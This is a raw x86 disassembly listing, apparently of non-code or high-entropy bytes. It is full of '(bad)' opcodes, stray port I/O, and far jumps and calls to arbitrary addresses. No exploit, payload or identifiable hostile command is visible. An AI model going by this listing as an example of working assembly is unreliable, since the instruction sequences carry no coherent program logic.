  41ee4d:	xor    al,0x78
  41ee4f:	(bad)  
  41ee50:	aam    0x86
  41ee52:	test   eax,0x7d39c771
  41ee57:	sar    BYTE PTR [edx+ebp*8-0x2a],cl
  41ee5b:	into   
  41ee5c:	push   ebp
  41ee5d:	in     al,0x4e
  41ee5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee60:	in     eax,0x85
  41ee62:	aaa    
  41ee63:	aaa    
  41ee64:	hlt    
  41ee65:	push   cs
  41ee66:	inc    eax
  41ee67:	ror    DWORD PTR [edi+0x76],cl
  41ee6a:	push   edi
  41ee6b:	fcom   DWORD PTR [eax+0x3af0055e]
  41ee71:	les    esp,FWORD PTR [edx+0x15a06e2b]
  41ee77:	sub    DWORD PTR [edi+ecx*8+0x2c],0xfffffff0
  41ee7c:	popa   
  41ee7d:	adc    edx,eax
  41ee7f:	scas   eax,DWORD PTR es:[edi]
  41ee80:	add    al,0x2b
  41ee82:	sbb    DWORD PTR [eax+0x4819e635],edx
  41ee88:	jg     0x41ee0f
  41ee8a:	adc    ebp,DWORD PTR [eax+0x46]
  41ee8d:	sbb    BYTE PTR [ebx-0x67],dl
  41ee90:	mov    esp,0x1ce77d3c
  41ee95:	push   ds
  41ee96:	fidiv  DWORD PTR [eax+ebx*4+0x65]
  41ee9a:	pop    ss
  41ee9b:	rcr    DWORD PTR [ebp+0x6f685f46],0x6a
  41eea2:	std    
  41eea3:	mov    esi,0xdeadfddd
  41eea8:	jp     0x41eefe
  41eeaa:	mov    ds:0xb5c7a754,al
  41eeaf:	push   esp
  41eeb0:	xchg   ebp,eax
  41eeb1:	and    edi,DWORD PTR [ebp-0x24]
  41eeb4:	ja     0x41ef0a
  41eeb6:	sahf   
  41eeb7:	sub    DWORD PTR [ebx],esi
  41eeb9:	xchg   BYTE PTR [esi+0x3a],ch
  41eebc:	icebp  
  41eebd:	int    0x37
  41eebf:	sub    DWORD PTR [ecx-0x4a],ecx
  41eec2:	and    eax,DWORD PTR [esi-0x4ff429f8]
  41eec8:	in     eax,0xaa
  41eeca:	mov    ah,0x1d
  41eecc:	push   ecx
  41eecd:	jns    0x41ef4e
  41eecf:	xor    eax,0x9fe71a5e
  41eed4:	clc    
  41eed5:	out    0x38,eax
  41eed7:	dec    eax
  41eed8:	jnp    0x41ee5b
  41eeda:	out    0x65,al
  41eedc:	dec    ebx
  41eedd:	cmp    esp,DWORD PTR [ebx+ebp*1]
  41eee0:	lea    ecx,[eax]
  41eee2:	addr16 clc 
  41eee4:	cmp    bl,BYTE PTR [ebx-0x6722a527]
  41eeea:	mov    ebp,0x43a8b013
  41eeef:	xchg   edx,eax
  41eef0:	xor    al,0x54
  41eef2:	test   ebx,0x2b3c7d94
  41eef8:	pop    ebp
  41eef9:	mov    eax,0x548e4df9
  41eefe:	jnp    0x41ef59
  41ef00:	or     eax,0x14f939a
  41ef05:	adc    BYTE PTR [ebx],ah
  41ef07:	cs mov ecx,0x7051ee83
  41ef0d:	xchg   ebp,eax
  41ef0e:	sub    al,0x8b
  41ef10:	or     al,0xaa
  41ef12:	sub    eax,0x9366e140
  41ef17:	out    0x62,eax
  41ef19:	data16 mov WORD PTR [ebp+0x3d],?
  41ef1d:	ss mov bh,0x40
  41ef20:	stos   DWORD PTR es:[edi],eax
  41ef21:	(bad)
  41ef26:	sub    ecx,DWORD PTR [esi]
  41ef28:	jge    0x41ef95
  41ef2a:	dec    esi
  41ef2b:	rcl    BYTE PTR [edx],1
  41ef2d:	dec    edx
  41ef2e:	mov    ds:0x982afaf7,eax
  41ef33:	fs in  eax,dx
  41ef35:	add    DWORD PTR [esi+0x23],esi
  41ef38:	mov    dh,BYTE PTR [eax-0x2b18e561]
  41ef3e:	cmp    ecx,DWORD PTR [ebx]
  41ef40:	inc    ebp
  41ef41:	shr    BYTE PTR [eax+0x2b],1
  41ef44:	push   edi
  41ef45:	es inc edi
  41ef47:	xchg   ebx,eax
  41ef48:	(bad)  
  41ef4a:	adc    DWORD PTR [esi+esi*2+0x75],0xaf5134d4
  41ef52:	xor    DWORD PTR [esi+0x2a],ecx
  41ef55:	sub    DWORD PTR [esi],edi
  41ef57:	pop    ebx
  41ef58:	xchg   edx,eax
  41ef59:	or     esi,DWORD PTR ds:0x21322f9e
  41ef5f:	leave  
  41ef60:	stos   DWORD PTR es:[edi],eax
  41ef61:	fisub  WORD PTR [edx+ebp*8]
  41ef64:	popa   
  41ef65:	jnp    0x41ef80
  41ef67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef68:	add    BYTE PTR [ecx+0x21],0xe5
  41ef6c:	(bad)  
  41ef6d:	punpckhwd mm2,QWORD PTR [eax*1-0x45c08cb4]
  41ef75:	mov    DWORD PTR [ebx-0x32],ebp
  41ef78:	xchg   ebx,eax
  41ef79:	or     al,0x84
  41ef7b:	pop    esi
  41ef7c:	icebp  
  41ef7d:	mov    al,0x5b
  41ef7f:	add    ebx,eax
  41ef81:	fs push ebx
  41ef83:	sub    esi,DWORD PTR [edx]
  41ef85:	fs jg  0x41efa5
  41ef88:	ins    BYTE PTR es:[edi],dx
  41ef89:	shl    ah,1
  41ef8b:	rol    BYTE PTR [esi+0x4f],0x77
  41ef8f:	push   ds
  41ef90:	push   0xf091a68
  41ef95:	adc    bl,BYTE PTR [ebx+0x55]
  41ef98:	pop    ss
  41ef99:	sbb    eax,DWORD PTR [edi]
  41ef9b:	xor    ebp,eax
  41ef9d:	xchg   ebx,eax
  41ef9e:	inc    esi
  41ef9f:	sysenter 
  41efa1:	mov    esi,DWORD PTR [eax+ecx*8]
  41efa4:	xor    ah,BYTE PTR [esi+0x22f8a05b]
  41efaa:	pop    es
  41efab:	aaa    
  41efac:	mov    eax,ds:0xd64ee3bc
  41efb1:	imul   bl
  41efb3:	push   edi
  41efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efb5:	mov    dl,0xc
  41efb7:	fsub   DWORD PTR [ecx]
  41efb9:	inc    esi
  41efba:	sub    DWORD PTR [eax+0x59],edi
  41efbd:	mov    al,ds:0x99c345b8
  41efc2:	mov    cl,0xe4
  41efc4:	cmp    edx,DWORD PTR [ebx+0x5e]
  41efc7:	sub    eax,DWORD PTR [ecx-0x234ae7ad]
  41efcd:	xchg   edx,eax
  41efce:	and    edi,DWORD PTR [eax+0x48d23865]
  41efd4:	fs pop edx
  41efd6:	cmp    ah,dl
  41efd8:	test   eax,0x869ed9f8
  41efdd:	rol    BYTE PTR [edx],0x99
  41efe0:	add    dl,bl
  41efe2:	push   cs
  41efe3:	jne    0x41f014
  41efe5:	cmp    esi,DWORD PTR [edx-0x74ca61b0]
  41efeb:	addr16 ja 0x41efff
  41efee:	scas   al,BYTE PTR es:[edi]
  41efef:	leave  
  41eff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eff2:	into   
  41eff3:	adc    eax,DWORD PTR [edi+0x472b341a]
  41eff9:	push   esi
  41effa:	jp     0x41ef9f
  41effc:	cdq    
  41effd:	and    eax,0xd6a54088
  41f002:	(bad)  
  41f004:	aam    0xf1
  41f006:	jmp    0xbc2f:0xadaf93d5
  41f00d:	not    ebp
  41f00f:	shl    DWORD PTR [ecx-0x64a78dfa],1
  41f015:	nop
  41f016:	sub    eax,0x47f7495a
  41f01c:	cmc    
  41f01d:	je     0x41f04a
  41f01f:	inc    ecx
  41f020:	rcr    BYTE PTR fs:[edx],cl
  41f023:	or     BYTE PTR [esi],cl
  41f025:	xor    bh,BYTE PTR [ecx+0x57]
  41f028:	outs   dx,BYTE PTR ds:[esi]
  41f029:	ret    0x50af
  41f02c:	shr    DWORD PTR [edx-0x2fa313fd],0x66
  41f033:	(bad)  [eax]
  41f035:	jmp    0x41f082
  41f037:	and    DWORD PTR [edi],esp
  41f039:	rcr    esp,1
  41f03b:	sub    al,0xc9
  41f03d:	out    0x5e,al
  41f03f:	pop    esi
  41f040:	ja     0x41f000
  41f042:	jae    0x41eff6
  41f044:	add    bh,BYTE PTR [ebx-0x7b06103a]
  41f04a:	aad    0xf4
  41f04c:	xchg   DWORD PTR [ebp+0x1a],edx
  41f04f:	ins    DWORD PTR es:[edi],dx
  41f050:	imul   ebx,DWORD PTR [ebx],0x5c
  41f053:	hlt    
  41f054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f055:	add    eax,0x15cbe385
  41f05a:	push   ebx
  41f05b:	xor    BYTE PTR [eax],dh
  41f05d:	push   ebx
  41f05e:	cdq    
  41f05f:	push   esp
  41f060:	cmp    al,0xea
  41f062:	pop    ecx
  41f063:	jnp    0x41effa
  41f065:	adc    al,0x91
  41f067:	(bad)  
  41f068:	retf   
  41f069:	(bad)
  41f06d:	pop    esp
  41f06e:	inc    esi
  41f06f:	cdq    
  41f070:	jns    0x41f0bb
  41f072:	xchg   ebx,eax
  41f073:	adc    BYTE PTR [ebx+0x3f],cl
  41f076:	mov    ebx,0x53a93015
  41f07b:	or     BYTE PTR [esi],al
  41f07d:	or     esp,DWORD PTR [edx+ebp*2+0x14552777]
  41f084:	mov    ebp,0xd0102a9f
  41f08a:	pushf  
  41f08b:	cld    
  41f08c:	hlt    
  41f08d:	fmul   QWORD PTR [esi-0x200cce83]
  41f093:	jbe    0x41f097
  41f095:	inc    ebp
  41f096:	pop    ebp
  41f097:	mov    edx,DWORD PTR [ebx+0x2db5a1b4]
  41f09d:	xchg   esi,eax
  41f09e:	pusha  
  41f09f:	mov    ds:0xa8d2f49d,al
  41f0a4:	mov    ebx,0xe5a6eaff
  41f0a9:	enter  0xbc50,0x3d
  41f0ad:	sbb    BYTE PTR [ebx+0x7f2aecff],cl
  41f0b3:	aaa    
  41f0b4:	mov    ds:0xd52d2344,eax
  41f0b9:	test   BYTE PTR [edi-0x6a],al
  41f0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bd:	retf   
  41f0be:	mov    al,ds:0xbf44f0ee
  41f0c3:	dec    edx
  41f0c4:	jp     0x41f0fa
  41f0c6:	xor    al,0x5b
  41f0c8:	mov    al,0xa1
  41f0ca:	and    ah,dl
  41f0cc:	ins    DWORD PTR es:[edi],dx
  41f0cd:	imul   eax,DWORD PTR [ebp-0x37a525da],0x2729968c
  41f0d7:	pop    ecx
  41f0d8:	push   esi
  41f0d9:	push   edx
  41f0da:	add    DWORD PTR [eax+ecx*4+0x47],esp
  41f0de:	hlt    
  41f0df:	jno    0x41f06f
  41f0e1:	jne    0x41f068
  41f0e3:	mov    ebp,0xcb9b49dc
  41f0e8:	push   ebp
  41f0e9:	add    edi,esp
  41f0eb:	lock push ss
  41f0ed:	stos   DWORD PTR es:[edi],eax
  41f0ee:	mov    eax,0xcb88f3ca
  41f0f3:	jecxz  0x41f115
  41f0f5:	cmc    
  41f0f6:	mov    ebx,0x91a67319
  41f0fb:	jp     0x41f11b
  41f0fd:	mov    ebx,0x21cc6f86
  41f102:	popf   
  41f103:	jg     0x41f0e7
  41f105:	adc    al,0xac
  41f107:	or     eax,0x2593f2dc
  41f10c:	les    esi,FWORD PTR [ebx-0x55]
  41f10f:	fs jmp 0x41f0a0
  41f112:	js     0x41f15d
  41f114:	loope  0x41f194
  41f116:	and    cl,BYTE PTR [ecx]
  41f118:	fldenv [esi+0x62ff6a86]
  41f11e:	mov    ebx,0x30119e2a
  41f123:	sub    esp,ebx
  41f125:	and    DWORD PTR [edx-0x63c631ea],edx
  41f12b:	inc    ebp
  41f12c:	sbb    bl,BYTE PTR [edi]
  41f12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f12f:	lea    esp,[esi-0x5be8a434]
  41f135:	pop    ebp
  41f136:	sar    DWORD PTR [edx],0xea
  41f139:	inc    ebp
  41f13a:	dec    ecx
  41f13b:	mov    ah,0xcb
  41f13d:	push   0xffffffb5
  41f13f:	mov    bl,0xa1
  41f141:	sub    dh,cl
  41f143:	addr16 test ebp,esp
  41f146:	inc    edi
  41f147:	ret    0x8cda
  41f14a:	pop    ss
  41f14b:	cmp    al,0xc4
  41f14d:	(bad)  
  41f14e:	pushf  
  41f14f:	sbb    al,0x96
  41f151:	(bad)  
  41f152:	and    BYTE PTR [edi+0x49a33b6a],0x66
  41f159:	and    BYTE PTR [edx],al
  41f15b:	pop    esp
  41f15c:	jmp    0x41f0f8
  41f15e:	xchg   edx,eax
  41f15f:	(bad)  
  41f161:	dec    esp
  41f162:	or     eax,0x3923324
  41f167:	out    dx,al
  41f168:	pop    ds
  41f169:	ja     0x41f1c4
  41f16b:	out    0x5c,al
  41f16d:	(bad)  [esi-0x9]
  41f170:	pop    ss
  41f171:	fidivr WORD PTR [edx+0x23]
  41f174:	mov    ah,0x3e
  41f176:	xor    esi,esp
  41f178:	repnz icebp 
  41f17a:	pop    ss
  41f17b:	jns    0x41f1f8
  41f17d:	call   0xe6ed:0x70ef1267
  41f184:	or     bl,BYTE PTR [edx+0x7b]
  41f187:	jmp    0xe268:0x68836f15
  41f18e:	cmp    eax,0x6f43c020
  41f193:	inc    ecx
  41f194:	loop   0x41f16d
  41f196:	int3   
  41f197:	ja     0x41f214
  41f199:	adc    eax,0xb7950910
  41f19e:	jmp    FWORD PTR [ecx+ebx*4]
  41f1a1:	test   al,0xab
  41f1a3:	pushf  
  41f1a4:	inc    edx
  41f1a5:	cmp    eax,0x6d371073
  41f1aa:	out    0x63,al
  41f1ac:	pop    ebx
  41f1ad:	dec    esp
  41f1ae:	mov    esp,0x9f995361
  41f1b3:	(bad)  
  41f1b5:	sbb    DWORD PTR [ecx-0x5b],edx
  41f1b8:	jns    0x41f21f
  41f1ba:	mov    BYTE PTR [ebp-0x288b9ea3],bl
  41f1c0:	(bad)  
  41f1c1:	xchg   edx,eax
  41f1c2:	out    dx,eax
  41f1c3:	mov    esi,0x35c03ab7
  41f1c8:	pop    edi
  41f1c9:	ja     0x41f1b1
  41f1cb:	fidiv  WORD PTR [eax-0x32]
  41f1ce:	ret    
  41f1cf:	dec    esp
  41f1d0:	rcl    BYTE PTR [eax],1
  41f1d2:	ja     0x41f220
  41f1d4:	rol    DWORD PTR [eax-0x57],cl
  41f1d7:	int3   
  41f1d8:	enter  0xa444,0xe8
  41f1dc:	addr16 mov esi,0x760d08d1
  41f1e2:	xchg   BYTE PTR [ebp+eiz*2-0x5684060b],bl
  41f1e9:	fisub  WORD PTR [edi+0x4e142b56]
  41f1ef:	jnp    0x41f19d
  41f1f1:	adc    eax,0x54e40063
  41f1f6:	jb     0x41f204
  41f1f8:	popa   
  41f1f9:	div    esi
  41f1fb:	out    dx,al
  41f1fc:	xchg   DWORD PTR [ebp+0x26],esi
  41f1ff:	cli    
  41f200:	xchg   ebx,eax
  41f201:	inc    eax
  41f202:	retf   0xaf48
  41f205:	sbb    ebp,ecx
  41f207:	add    eax,0x520372ab
  41f20c:	dec    eax
  41f20d:	push   ebx
  41f20e:	cmp    dh,al
  41f210:	xor    esp,DWORD PTR [edi+0xb]
  41f213:	out    0x6,eax
  41f215:	sbb    eax,0xf7501b90
  41f21a:	shr    DWORD PTR [ecx-0x58889d05],1
  41f220:	stos   DWORD PTR es:[edi],eax
  41f221:	adc    eax,0xfebd2bcd
  41f226:	jae    0x41f24b
  41f228:	or     al,0xa7
  41f22a:	js     0x41f21c
  41f22c:	mov    eax,0xc27e0a72
  41f231:	jl     0x41f227
  41f233:	retf   
  41f234:	dec    edx
  41f235:	mov    dl,0x1e
  41f237:	cs inc ebp
  41f239:	dec    ebx
  41f23a:	ret    0x5664
  41f23d:	pop    ss
  41f23e:	inc    ecx
  41f23f:	inc    ecx
  41f240:	mov    esp,0xe1442c8c
  41f245:	loope  0x41f1d5
  41f247:	fwait
  41f248:	scas   al,BYTE PTR es:[edi]
  41f249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24a:	leave  
  41f24b:	or     eax,0x616b3134
  41f250:	mov    es,WORD PTR [esi]
  41f252:	adc    al,0xa6
  41f255:	mov    ch,0x54
  41f257:	out    0x78,al
  41f259:	(bad)  
  41f25a:	xor    cl,BYTE PTR [ebx]
  41f25c:	ret    
  41f25d:	(bad)  
  41f25e:	jg     0x41f1ed
  41f260:	call   0x972:0x68cefba9
  41f267:	js     0x41f209
  41f269:	(bad)  
  41f26a:	sub    DWORD PTR [edi-0x74],0x1a8f7d85
  41f271:	jne    0x41f2c2
  41f273:	mov    dl,0xe3
  41f275:	aas    
  41f276:	inc    ebp
  41f277:	ins    BYTE PTR es:[edi],dx
  41f278:	adc    al,0xce
  41f27a:	out    0x8e,eax
  41f27c:	or     DWORD PTR gs:[ebx-0x77],edx
  41f280:	mov    ds:0x3ca33596,eax
  41f285:	mov    ebp,0x1aff2a77
  41f28a:	test   ch,dh
  41f28c:	push   cs
  41f28d:	scas   al,BYTE PTR es:[edi]
  41f28e:	jae    0x41f2ef
  41f290:	push   ebx
  41f291:	xor    ecx,DWORD PTR [ebp+0x69f0b0a8]
  41f297:	retf   
  41f298:	jae    0x41f297
  41f29a:	loope  0x41f27f
  41f29c:	pop    ds
  41f29d:	sti    
  41f29e:	cld    
  41f29f:	and    dh,bh
  41f2a1:	sti    
  41f2a2:	pop    es
  41f2a3:	mov    bl,0xde
  41f2a5:	mov    dl,0x9f
  41f2a7:	out    0x54,al
  41f2a9:	es (bad) 
  41f2ab:	fistp  QWORD PTR [esi+0x54d19c94]
  41f2b1:	(bad)  
  41f2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2b3:	jge    0x41f301
  41f2b5:	or     eax,0x17445ebc
  41f2ba:	xchg   edx,eax
  41f2bb:	jae    0x41f306
  41f2bd:	sbb    al,0x1d
  41f2bf:	pusha  
  41f2c0:	mov    DWORD PTR [ebp+0x15731996],0xeb401839
  41f2ca:	sub    dh,BYTE PTR [edx-0x1f]
  41f2cd:	mov    ah,0x44
  41f2cf:	shr    edx,0xdc
  41f2d2:	shl    DWORD PTR [esi-0x4ddd54b8],0xa6
  41f2d9:	cmp    bh,al
  41f2db:	push   ebp
  41f2dc:	sti    
  41f2dd:	add    cl,BYTE PTR es:[ebx]
  41f2e0:	in     eax,dx
  41f2e1:	add    eax,0x2f3a6a30
  41f2e6:	or     BYTE PTR [edi+0x49],al
  41f2e9:	cs jl  0x41f314
  41f2ec:	push   cs
  41f2ed:	jmp    0xc7b2b265
  41f2f2:	inc    edi
  41f2f3:	int3   
  41f2f4:	stos   DWORD PTR es:[edi],eax
  41f2f5:	xchg   edi,eax
  41f2f6:	push   ds
  41f2f7:	ret    
  41f2f8:	(bad)  
  41f2f9:	cmp    cl,BYTE PTR ds:0xc33e1575
  41f2ff:	jae    0x41f359
  41f301:	clc    
  41f302:	leave  
  41f303:	pop    ecx
  41f304:	imul   DWORD PTR [eax]
  41f306:	jge    0x41f2a7
  41f308:	cmp    ecx,DWORD PTR [edi-0xe]
  41f30b:	lea    edx,[ebx]
  41f30d:	ja     0x41f37d
  41f30f:	jge    0x41f319
  41f311:	aaa    
  41f312:	ja     0x41f351
  41f314:	mov    al,ds:0xe64c206a
  41f319:	(bad)
  41f31c:	ins    DWORD PTR es:[edi],dx
  41f31d:	adc    edi,DWORD PTR [edi]
  41f31f:	enter  0xddeb,0x19
  41f323:	shl    BYTE PTR [esi-0x13],1
  41f326:	add    eax,DWORD PTR [esi+eax*1+0x72]
  41f32a:	imul   edx,ecx,0xffffffa4
  41f32d:	adc    BYTE PTR ds:0x7ebd8639,0xc9
  41f334:	popf   
  41f335:	fcom   DWORD PTR [ecx+0x2089286a]
  41f33b:	sbb    DWORD PTR [edi+0x66],0x4e003f2b
  41f342:	ret    
  41f343:	or     eax,0xaacfa66b
  41f348:	push   ecx
  41f349:	sbb    esp,ecx
  41f34b:	mov    eax,ds:0x3b834fc8
  41f350:	cdq    
  41f351:	aam    0x2e
  41f353:	add    dh,BYTE PTR [esi+0x396ddc92]
  41f359:	sub    DWORD PTR [ebx-0x1792d665],esp
  41f35f:	imul   eax,DWORD PTR [ebp+esi*4-0x10ce4641],0xa6400dfb
  41f36a:	(bad)  
  41f36b:	dec    esp
  41f36c:	xor    bl,BYTE PTR [edx-0x2]
  41f36f:	cmp    eax,0xfc189c6f
  41f374:	or     al,0xb6
  41f376:	push   edi
  41f377:	sub    esi,DWORD PTR [ebx-0x4a28454c]
  41f37d:	test   eax,0x58f1f3ba
  41f382:	les    esi,FWORD PTR [esi+0x4a]
  41f385:	dec    edi
  41f386:	dec    edi
  41f387:	jge    0x41f3b6
  41f389:	inc    ecx
  41f38a:	test   BYTE PTR [ecx-0x4e],cl
  41f38d:	inc    edx
  41f38e:	add    al,0x46
  41f390:	xor    eax,0x7a0fece0
  41f395:	add    BYTE PTR [ebx],bl
  41f397:	add    bh,BYTE PTR [ebp+0x1ee94ecf]
  41f39d:	pusha  
  41f39e:	sbb    bl,0x91
  41f3a1:	adc    esi,edx
  41f3a3:	clc    
  41f3a4:	leave  
  41f3a5:	push   0x66
  41f3a7:	add    DWORD PTR [ebp-0x36],edx
  41f3aa:	call   0x5c7a:0xa9b9e3e1
  41f3b1:	adc    ebx,DWORD PTR [esi]
  41f3b3:	les    ecx,FWORD PTR [ecx+eiz*4-0x44]
  41f3b7:	out    dx,eax
  41f3b8:	loope  0x41f3dc
  41f3ba:	frstor [eax-0x2a]
  41f3bd:	xor    esp,DWORD PTR [ebp+ebp*1+0x7c6c0609]
  41f3c4:	popa   
  41f3c5:	sub    ecx,DWORD PTR ds:[ecx+ebx*1]
  41f3c9:	jle    0x41f392
  41f3cb:	lods   eax,DWORD PTR ds:[esi]
  41f3cc:	inc    esp
  41f3cd:	aaa    
  41f3ce:	imul   edx,DWORD PTR [ebp-0x38],0xfffffffe
  41f3d2:	pop    ds
  41f3d3:	enter  0x409f,0x2d
  41f3d7:	mov    ah,dh
  41f3d9:	pusha  
  41f3da:	cmp    eax,0x2fa87914
  41f3df:	jecxz  0x41f42a
  41f3e1:	adc    esi,DWORD PTR [esi+eiz*8-0x58]
  41f3e5:	das    
  41f3e6:	mov    bh,BYTE PTR [edx]
  41f3e8:	sbb    bh,BYTE PTR [eax+0x23]
  41f3eb:	std    
  41f3ec:	pop    esi
  41f3ed:	dec    edx
  41f3ee:	adc    DWORD PTR [eax],eax
  41f3f0:	and    BYTE PTR [edi-0x67d31478],cl
  41f3f6:	sar    al,0xe6
  41f3f9:	adc    BYTE PTR [esi],cl
  41f3fb:	arpl   WORD PTR [ecx+0x10b1a06d],ax
  41f401:	popa   
  41f402:	arpl   WORD PTR [ecx],dx
  41f404:	movd   mm3,DWORD PTR [edi-0x494c2356]
  41f40b:	icebp  
  41f40c:	push   0x4f
  41f40e:	ds or  eax,0x41b581cf
  41f414:	inc    ecx
  41f415:	loopne 0x41f48f
  41f417:	cmp    eax,0x7f27c168
  41f41c:	push   ds
  41f41d:	sub    bl,BYTE PTR [ebp-0x51]
  41f420:	lds    edi,FWORD PTR [ecx-0x54]
  41f423:	aas    
  41f424:	pop    edx
  41f425:	mov    eax,0xe8537c40
  41f42a:	mov    eax,0xa598f126
  41f42f:	or     al,0xfe
  41f431:	fsub   QWORD PTR [ecx+eiz*2]
  41f434:	mov    ebx,0x1ff02954
  41f439:	fcomp  DWORD PTR [esi-0x2f]
  41f43c:	and    BYTE PTR [ecx+0x496c422c],dl
  41f442:	jle    0x41f47e
  41f444:	inc    ecx
  41f445:	int3   
  41f446:	ret    0xa96a
  41f449:	mov    eax,ecx
  41f44b:	retf   
  41f44c:	leave  
  41f44d:	jb     0x41f44d
  41f44f:	shl    DWORD PTR [ebp-0x54],1
  41f452:	push   ds
  41f453:	cmp    ebp,DWORD PTR [edx]
  41f455:	mov    al,ds:0xe3d0cadf
  41f45a:	push   edx
  41f45b:	jp     0x41f400
  41f45d:	mov    es,WORD PTR [ebx+edi*2-0x51e739c7]
  41f464:	adc    al,0xa
  41f466:	sbb    ah,al
  41f468:	loopne 0x41f414
  41f46a:	in     al,0xc4
  41f46c:	repz mov ?,edx
  41f46f:	sbb    BYTE PTR [eax],0x3e
  41f472:	cli    
  41f473:	jge    0x41f4ae
  41f475:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f477:	xor    BYTE PTR [ebp-0x8],ah
  41f47a:	mov    esp,0xf6857740
  41f47f:	inc    eax
  41f480:	icebp  
  41f481:	jp     0x41f45e
  41f483:	or     bl,BYTE PTR [esi+0x21abfd3c]
  41f489:	les    edi,FWORD PTR [edx+0x5e6a5c16]
  41f48f:	sbb    dl,BYTE PTR [esi+0x1f603652]
  41f495:	repnz leave 
  41f497:	mov    al,ds:0x557b1643
  41f49c:	fimul  DWORD PTR [esi-0x80]
  41f49f:	jno    0x41f443
  41f4a1:	test   eax,0x8c68a1c9
  41f4a6:	xor    cl,BYTE PTR [edi+0x7c0551d6]
  41f4ac:	adc    DWORD PTR [edx-0x66fc606c],esi
  41f4b2:	add    dh,BYTE PTR ds:0x56f9416b
  41f4b8:	push   ds
  41f4b9:	outs   dx,BYTE PTR ds:[esi]
  41f4ba:	inc    ecx
  41f4bb:	xor    eax,0xbc285750
  41f4c0:	adc    BYTE PTR [esi+esi*8],ch
  41f4c3:	fldenv [edi+0x44]
  41f4c6:	int3   
  41f4c7:	mov    bh,0xa4
  41f4c9:	mov    esi,0xbe02c9ab
  41f4ce:	dec    ecx
  41f4cf:	xchg   edi,eax
  41f4d0:	mov    al,0x1a
  41f4d2:	idiv   bl
  41f4d4:	out    0x70,al
  41f4d6:	xchg   ebx,eax
  41f4d7:	sub    DWORD PTR [ebx-0x23a8ce82],esi
  41f4dd:	pop    edx
  41f4de:	fimul  DWORD PTR ds:0x4845762e
  41f4e4:	in     al,dx
  41f4e5:	jmp    0x3fc58ec5
  41f4ea:	xchg   esp,eax
  41f4eb:	and    BYTE PTR [ecx],bh
  41f4ed:	push   0x7a
  41f4ef:	jne    0x41f51c
  41f4f1:	cld    
  41f4f2:	shl    DWORD PTR [edi-0x39],1
  41f4f5:	or     al,BYTE PTR [esi+0x811b46a]
  41f4fb:	scas   al,BYTE PTR es:[edi]
  41f4fc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4fe:	add    esp,DWORD PTR [ecx-0x52e24323]
  41f504:	dec    edi
  41f505:	sub    DWORD PTR [ebx-0x520551c7],edi
  41f50b:	call   0xd8bf:0x42f199c3
  41f512:	xchg   ebx,eax
  41f513:	jns    0x41f591
  41f515:	(bad)  
  41f516:	xor    eax,0xca02563e
  41f51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f51c:	xchg   ebp,eax
  41f51d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f51e:	mov    dl,0xab
  41f520:	lods   eax,DWORD PTR ds:[esi]
  41f521:	pop    es
  41f522:	or     al,0xe
  41f524:	mov    al,0x7f
  41f526:	inc    esi
  41f527:	sbb    edx,edi
  41f529:	mov    dh,0x69
  41f52b:	hlt    
  41f52c:	repnz out 0xe4,eax
  41f52f:	das    
  41f530:	data16 mov WORD PTR [ecx],?
  41f533:	push   0x9487911e
  41f538:	dec    edx
  41f539:	adc    al,0x97
  41f53b:	icebp  
  41f53c:	or     al,0xa7
  41f53e:	leave  
  41f53f:	test   al,0x37
  41f541:	add    BYTE PTR [ecx+esi*4+0x566ea809],ch
  41f548:	mov    cl,0xae
  41f54a:	test   BYTE PTR [eax-0x159eeb65],cl
  41f550:	mov    edi,0xda680513
  41f555:	mov    ah,0x13
  41f557:	and    bh,al
  41f559:	into   
  41f55a:	add    al,0xd4
  41f55c:	inc    ebp
  41f55d:	and    eax,ebx
  41f55f:	ds push 0x22402e68
  41f565:	rcr    BYTE PTR [eax-0x6e],0x8b
  41f569:	pop    ebp
  41f56a:	adc    esp,esp
  41f56c:	inc    esp
  41f56d:	mov    ebx,0xb1946a9e
  41f572:	mov    WORD PTR [edx+0x4d],ds
  41f575:	cld    
  41f576:	mov    bl,0xa9
  41f578:	es xchg ecx,eax
  41f57a:	adc    ecx,eax
  41f57c:	sti    
  41f57d:	push   eax
  41f57e:	dec    ebp
  41f57f:	in     eax,dx
  41f580:	out    0x3e,eax
  41f582:	jno    0x41f5d2
  41f584:	dec    edx
  41f585:	jp     0x41f524
  41f587:	push   0x7d
  41f589:	mov    DWORD PTR [ebx+0x2f],edx
  41f58c:	and    eax,0x6f18236f
  41f591:	cmovns esi,esi
  41f594:	mov    eax,ds:0x2f201404
  41f599:	ja     0x41f5e3
  41f59b:	mov    bl,0x24
  41f59d:	xchg   edx,eax
  41f59e:	xor    eax,0x862ade4
  41f5a3:	(bad)  
  41f5a4:	call   0xf161:0x28d157e5
  41f5ab:	pop    edi
  41f5ac:	xchg   edx,eax
  41f5ae:	cmp    ah,BYTE PTR [esi-0x66]
  41f5b1:	icebp  
  41f5b2:	scas   al,BYTE PTR es:[edi]
  41f5b3:	mov    ch,0x2a
  41f5b5:	sub    al,BYTE PTR [ebp+0x79]
  41f5b8:	out    0xb6,al
  41f5ba:	out    0x7c,eax
  41f5bc:	sbb    al,cl
  41f5be:	or     ch,BYTE PTR [eax+0x2005127d]
  41f5c4:	sar    BYTE PTR [ebx+0x23],cl
  41f5c7:	das    
  41f5c8:	inc    ecx
  41f5c9:	and    dh,dh
  41f5cb:	cmp    bl,0x6c
  41f5ce:	stos   BYTE PTR es:[edi],al
  41f5cf:	and    DWORD PTR [edi-0x6c],0xa1a9a1ee
  41f5d6:	push   edi
  41f5d7:	or     esi,ecx
  41f5d9:	es dec esi
  41f5db:	into   
  41f5dc:	inc    esi
  41f5dd:	ss adc al,0x99
  41f5e0:	mov    eax,ds:0x8b7800b9
  41f5e5:	pop    ebx
